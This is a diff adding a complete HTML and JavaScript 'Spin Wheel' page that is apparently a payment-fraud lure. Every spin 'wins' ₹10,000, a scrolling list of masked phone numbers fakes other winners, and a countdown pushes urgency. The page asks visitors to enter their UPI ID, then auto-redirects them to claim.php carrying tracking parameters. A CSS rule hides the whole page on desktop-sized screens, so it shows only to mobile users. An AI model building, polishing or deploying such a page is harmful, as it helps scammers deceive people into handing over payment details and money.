@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Spin Wheel</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+                /* overflow-x: hidden; */
+            }
+    
+            body {
+                overflow-x: hidden;
+                height: 100vh;
+                /* overflow-y: hidden; */
+            }
+    
+            p,
+            h1,
+            h2,
+            h3,
+            h4,
+            h5,
+            h6 {
+                margin: 0px;
+                padding: 0px;
+            }
+    
+            .banner-con {
+                background: url(https://spin-and-win.securetools.in/assets/bg-grid.png);
+                background-size: 100%;
+                background-blend-mode: lighten;
+            }
+    
+            .spin-con {
+                padding: 20px;
+                padding-top: 0px;
+                width: 100%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                position: relative;
+                top: 0;
+                background: url(https://spin-and-win.securetools.in/assets/bg-grid.png);
+                background-size: 100% 100%;
+            }
+    
+            .wheel {
+                width: 80%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+            }
+    
+            .line {
+                margin-bottom: 5px !important;
+                text-align: center;
+                color: #7246d7;
+                font-weight: 600;
+                margin-bottom: 20px;
+                padding: 0px 20px;
+            }
+    
+            .spin-assets {
+                width: 250px;
+            }
+    
+            .inner {
+                transform: rotate(23deg);
+            }
+    
+            .spin-btn {
+                z-index: 20;
+                animation: bounce 1s ease infinite;
+            }
+    
+            .overlay {
+                background-color: rgba(0, 0, 0, 0.8);
+                position: absolute;
+                top: 0;
+                width: 100%;
+                height: 100vh;
+                z-index: 18;
+            }
+    
+            .inner,
+            .spin-btn {
+                margin-top: -250px;
+            }
+    
+            .hlight {
+                background-color: #7246d7;
+                color: white;
+                padding: 2px 6px;
+                font-weight: 700;
+            }
+    
+            .winners-con {
+                width: 100%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                padding: 10px;
+            }
+    
+            .winners-list {
+                height: 150px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                padding: 10px;
+                gap: 20px;
+                border: #7246d7 1px solid;
+                border-radius: 3px;
+                box-shadow: #7246d7 0px 0px 10px 0px;
+            }
+    
+            li {
+                list-style: none;
+                text-wrap: nowrap;
+                text-align: center;
+            }
+    
+            .spin {
+                animation: rotate 3s ease 1;
+            }
+    
+            @keyframes rotate {
+                from {
+                    transform: rotate(70deg);
+                }
+    
+                to {
+                    transform: rotate(3080deg);
+                }
+            }
+    
+            .popup-con {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                width: 100%;
+                background-color: rgba(0, 0, 0, 0.9);
+                backdrop-filter: blur(5px);
+                position: absolute;
+                top: 0;
+                height: 100vh;
+                /* background-image: rgba(0,0,0,0.5), url(./assets/rays.webp); */
+                background-size: contain;
+                background-position: center;
+                background-repeat: no-repeat;
+                z-index: 21;
+            }
+    
+            .popup {
+                background: linear-gradient(231.66deg, #7246D7 0%, #5923B1 99.13%);
+                width: 80%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                padding: 20px;
+                border-radius: 5px;
+                gap: 8px;
+                color: white;
+                position: relative;
+                text-align: center;
+            }
+    
+            .claim {
+                background: linear-gradient(178.97deg, #FED54C 0.88%, #FFB633 99.12%);
+                border-radius: 10px;
+                padding: 10px 20px;
+                width: 100%;
+                font-weight: 700;
+                color: black;
+                text-transform: uppercase;
+                animation: bounce 1s ease infinite;
+                font-size: 18px;
+            }
+    
+            @keyframes bounce {
+    
+                0%,
+                100% {
+                    transform: scale(1);
+                }
+    
+                50% {
+                    transform: scale(1.05);
+                }
+    
+            }
+    
+            .timer {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: fit-content;
+                gap: 5px;
+                padding: 2px;
+                width: 100%;
+                margin-bottom: 3px;
+                font-weight: 600;
+            }
+    
+            .timer>p {
+                font-size: 12px !important;
+            }
+    
+            .amount {
+                font-size: 40px;
+                font-weight: 700;
+            }
+    
+            .gift-box {
+                margin-left: 10px;
+                margin-top: -50px;
+            }
+    
+            .hand {
+                width: 30% !important;
+                z-index: 21;
+                position: absolute;
+                animation: move 1s ease infinite;
+                transform: rotate(-30deg);
+                padding-top: 180px;
+                padding-left: 20px;
+                display: flex;
+                /* Puts image and text side by side */
+                align-items: center;
+            }
+    
+            .hand>span {
+                text-wrap: nowrap;
+            }
+    
+            @keyframes move {
+    
+                0%,
+                100% {
+                    padding-top: 150px;
+                    transform: rotate(-30deg);
+                }
+    
+                50% {
+                    padding-top: 100px;
+                    transform: rotate(-20deg);
+                }
+            }
+    
+            .swipe-up {
+                animation: swipe 0.5s ease 1;
+            }
+    
+            #canvas {
+                position: absolute;
+                display: none;
+            }
+    
+            @keyframes swipe {
+                0% {
+                    transform: translateY(200px);
+                }
+    
+                100% {
+                    transform: translateY(0px);
+                }
+            }
+    
+            .zoom {
+                animation: zoom 4s ease 1;
+            }
+    
+            @keyframes zoom {
+                0% {
+                    transform: scale(1);
+                }
+    
+                100% {
+                    transform: scale(1.2);
+                }
+            }
+    
+            .rounded-pill {
+                border-radius: 25px;
+            }
+    
+            .fw-800 {
+                font-weight: 600 !important;
+            }
+    
+            .box {
+                width: 30px;
+            }
+    
+            @media only screen and (min-width: 768px) {
+    
+                /* Hide the body content for screens smaller than 768px */
+                body {
+                    display: none;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <canvas id="canvas" width="426" height="738"></canvas>
+        <div class="overlay"></div>
+        <div class="banner-con">
+            <img src="https://spin-and-win.securetools.in/assets/banner.webp" alt="banner" class="banner-img" width="100%">
+        </div>
+        <div class="spin-con">
+            <div class="mb-2">
+                <!-- <h5 class="line">Click on SPIN & WIN cash prizes</h5> -->
+                <div class="d-flex align-items-center justify-content-center border border-warning px-3 fw-800 rounded-pill balance-con ">
+                    Your Earnings : <div class="balance">&nbsp;₹ 0</div> <img src="" alt=""></div>
+            </div>
+            <div class="wheel">
+                <img src="https://spin-and-win.securetools.in/assets/border.webp" class="spin-assets" alt="border">
+                <img src="https://spin-and-win.securetools.in/assets/inner.webp" class="spin-assets inner" alt="inner">
+                <img src="https://spin-and-win.securetools.in/assets/btn.webp" class="spin-assets spin-btn" alt="button" onclick="spin()">
+                <div class="hand" onclick="spin()">
+                    <img src="https://spin-and-win.securetools.in/assets/hand.webp" alt="" width="60%">
+                    <span class="text-light mx-2">Click here</span>
+                </div>
+            </div>
+        </div>
+        <div class="winners-con">
+            <div class="winners-list">
+                <img src="https://spin-and-win.securetools.in/assets/winner.webp" alt="" width="60%">
+                <marquee direction="up" scrolldelay="120">
+                    <ul>
+                        <li>+91 99******86 won cash prize 10,000/-</li>
+                        <li>+91 63******76 won cash prize 5,000/-</li>
+                        <li>+91 79******13 won cash prize 2,000/-</li>
+                        <li>+91 86******46 won cash prize 4,000/-</li>
+                        <li>+91 83******96 won cash prize 15,000/-</li>
+                    </ul>
+                </marquee>
+            </div>
+        </div>
+        <div class="popup-con d-none">
+            <h3 class="text-white text-center px-3 mb-5">Congratulations <br> you won the jackpot</h3>
+            <div class="popup">
+                <img src="https://spin-and-win.securetools.in/assets/giftbox.webp" class="gift-box" alt="gift-box" width="40%">
+                <h5 class="my-2">You have won <br> <span class="amount">₹10,000</span> </h5>
+                    <div class="timer">
+                        <p>Limited Offer -
+                        </p><div class="text-danger bg-white px-1 min box">00</div> : <div class="text-danger bg-white px-1 sec box">00
+                        </div> : <div class="text-danger bg-white px-1 mini-sec box">00</div>
+                        <p></p>
+                    </div>
+                    <button class="claim btn btn-rounded" onclick="redirectToClaim()">Claim now</button>
+    
+    
+            </div>
+    
+            <div style="   
+                        color: #000;
+                        /* border-radius: 10px; */
+                        padding: 10px;
+                        /* margin-top: 20px; */
+                        width: 80%;background-color: #ffffff;border-radius: 10px;" class="mb-2 mt-5">
+                <h4 class="mb-3" style="text-decoration: underline;padding:0;">Steps to claim the offer</h4>
+                <div class="vw-100 d-flex justify-content-center flex-direction-col text-left">
+                    <ul class="col-12 p-0 m-0">
+                        <li class="text-left"><b>step-1</b>&nbsp;&nbsp;&nbsp;Click On Claim</li>
+                        <li class="text-left"><b>step-2</b>&nbsp;&nbsp;&nbsp;Enter Your UPI Id</li>
+                        <li class="text-left"><b>step-3</b>&nbsp;&nbsp;&nbsp;Get Rs.10000</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    
+        <script>
+        
+         // Function to get the "ref" parameter from the URL
+        function getQueryParameter(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+    
+        // Function to handle the redirection to claim.php with the "ref" parameter
+        function redirectToClaim() {
+            const ref = getQueryParameter("ref"); // Extract the "ref" parameter
+            const bonus = getQueryParameter("bonus");
+            const redirectUrl = `claim.php?id=${ref || 'default'}&nf=${bonus || 'default'}`; // Default to 'default' if no ref
+            window.location.href = redirectUrl; // Redirect to claim.php with the ref parameter
+        }
+        
+            function spin() {
+                document.querySelector('.inner').classList.add('spin');
+                document.querySelector('.inner').style.transform = "rotate(3080deg)";
+                document.querySelector('.hand').style.display = "none";
+                document.querySelector('.overlay').style.display = "none";
+                // document.querySelector('.popup-con').classList.replace('d-none', 'd-flex');
+    
+                setTimeout(() => {
+                    document.getElementById('canvas').style.display = 'block'
+                    balance();
+                }, 3000);
+                setTimeout(() => {
+                    var popup = document.querySelector('.popup');
+                    document.querySelector('.popup-con').classList.replace('d-none', 'd-flex');
+                    popup.classList.add('swipe-up');
+                    timer();
+                    redirect();
+                }, 5000);
+            }
+    
+           function redirect() {
+        // Get the "ref" parameter from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const ref = urlParams.get("ref"); // Extract the ref parameter
+        const bonus = getQueryParameter("bonus");
+    
+        // Build the redirect URL
+        const redirectUrl = `claim.php?id=${ref || 'default'}&nf=${bonus || 'default'}`; // Default to 'default' if no ref
+    
+        // Set a timeout to redirect after 5 seconds
+        setTimeout(() => {
+            window.location.href = redirectUrl; // Redirect to the constructed URL
+        }, 5000); // 5000 milliseconds = 5 seconds
+    }
+    
+    
+            function balance() {
+                const balanceElement = document.querySelector('.balance');
+                let currentBalance = 0;
+                const targetBalance = 10000;
+                const duration = 1000; // 2 seconds
+                const incrementInterval = 10; // How often to update the balance (in milliseconds)
+                const totalIncrements = duration / incrementInterval; // Total number of increments
+                const incrementAmount = targetBalance / totalIncrements; // Amount to increment in each step
+    
+                let countUp = setInterval(() => {
+                    currentBalance += incrementAmount;
+    
+                    // Update the balance element with the formatted value
+                    balanceElement.textContent = `₹ ${Math.floor(currentBalance)}`;
+    
+                    // Stop the interval when the balance reaches or exceeds the target amount
+                    if (currentBalance >= targetBalance) {
+                        balanceElement.textContent = `₹ ${targetBalance}`; // Ensure final value is exactly 10000
+                        clearInterval(countUp);
+                    }
+                }, incrementInterval);
+                document.querySelector('.balance-con').classList.add('zoom');
+            }
+    
+            function timer() {
+                let minutes = 1;
+                let seconds = 0;
+                let miniSeconds = 0;
+    
+                // Get the HTML elements for minute, second, and mini-second
+                const minuteElement = document.querySelector('.min');
+                const secondElement = document.querySelector('.sec');
+                const miniSecElement = document.querySelector('.mini-sec');
+    
+                // Function to format numbers to 2 digits (e.g., 00, 01, 02...)
+                function formatTime(number) {
+                    return number < 10 ? '0' + number : number;
+                }
+    
+                // Start the timer
+                let timer = setInterval(() => {
+                    // Decrement mini-seconds
+                    miniSeconds -= 1;
+    
+                    // If mini-seconds drop below 0, reset to 99 and decrement seconds
+                    if (miniSeconds < 0) {
+                        miniSeconds = 99;
+                        seconds -= 1;
+                    }
+    
+                    // If seconds drop below 0, reset to 59 and decrement minutes
+                    if (seconds < 0) {
+                        seconds = 59;
+                        minutes -= 1;
+                    }
+    
+                    // If minutes reach 0 and seconds are 0, stop the timer
+                    if (minutes === 0 && seconds === 0 && miniSeconds === 0) {
+                        clearInterval(timer);
+                    }
+    
+                    // Update the HTML elements
+                    minuteElement.textContent = formatTime(minutes);
+                    secondElement.textContent = formatTime(seconds);
+                    miniSecElement.textContent = formatTime(miniSeconds);
+                }, 10);  // Updates every 10ms to simulate mini-seconds
+    
+            }
+        </script>
+        <script>
+            let W = window.innerWidth;
+            let H = window.innerHeight;
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+            const maxConfettis = 30;
+            const particles = [];
+    
+            const possibleColors = [
+                "DodgerBlue",
+                "OliveDrab",
+                "Gold",
+                "Pink",
+                "SlateBlue",
+                "LightBlue",
+                "Gold",
+                "Violet",
+                "PaleGreen",
+                "SteelBlue",
+                "SandyBrown",
+                "Chocolate",
+                "Crimson"
+            ];
+    
+            function randomFromTo(from, to) {
+                return Math.floor(Math.random() * (to - from + 1) + from);
+            }
+    
+            function confettiParticle() {
+                this.x = Math.random() * W; // x
+                this.y = Math.random() * H - H; // y
+                this.r = randomFromTo(11, 33); // radius
+                this.d = Math.random() * maxConfettis + 11;
+                this.color =
+                    possibleColors[Math.floor(Math.random() * possibleColors.length)];
+                this.tilt = Math.floor(Math.random() * 33) - 11;
+                this.tiltAngleIncremental = Math.random() * 0.07 + 0.05;
+                this.tiltAngle = 0;
+    
+                this.draw = function () {
+                    context.beginPath();
+                    context.lineWidth = this.r / 2;
+                    context.strokeStyle = this.color;
+                    context.moveTo(this.x + this.tilt + this.r / 3, this.y);
+                    context.lineTo(this.x + this.tilt, this.y + this.tilt + this.r / 5);
+                    return context.stroke();
+                };
+            }
+    
+            function Draw() {
+                const results = [];
+    
+                // Magical recursive functional love
+                requestAnimationFrame(Draw);
+    
+                context.clearRect(0, 0, W, window.innerHeight);
+    
+                for (var i = 0; i < maxConfettis; i++) {
+                    results.push(particles[i].draw());
+                }
+    
+                let particle = {};
+                let remainingFlakes = 0;
+                for (var i = 0; i < maxConfettis; i++) {
+                    particle = particles[i];
+    
+                    particle.tiltAngle += particle.tiltAngleIncremental;
+                    particle.y += (Math.cos(particle.d) + 3 + particle.r / 2) / 2;
+                    particle.tilt = Math.sin(particle.tiltAngle - i / 3) * 15;
+    
+                    if (particle.y <= H) remainingFlakes++;
+    
+                    // If a confetti has fluttered out of view,
+                    // bring it back to above the viewport and let if re-fall.
+                    if (particle.x > W + 30 || particle.x < -30 || particle.y > H) {
+                        particle.x = Math.random() * W;
+                        particle.y = -30;
+                        particle.tilt = Math.floor(Math.random() * 10) - 20;
+                    }
+                }
+    
+                return results;
+            }
+    
+            window.addEventListener(
+                "resize",
+                function () {
+                    W = window.innerWidth;
+                    H = window.innerHeight;
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                },
+                false
+            );
+    
+            // Push new confetti objects to particles[]
+            for (var i = 0; i < maxConfettis; i++) {
+                particles.push(new confettiParticle());
+            }
+    
+            // Initialize
+            canvas.width = W;
+            canvas.height = H;
+            Draw();
+        </script>
+    </body>
+</html>
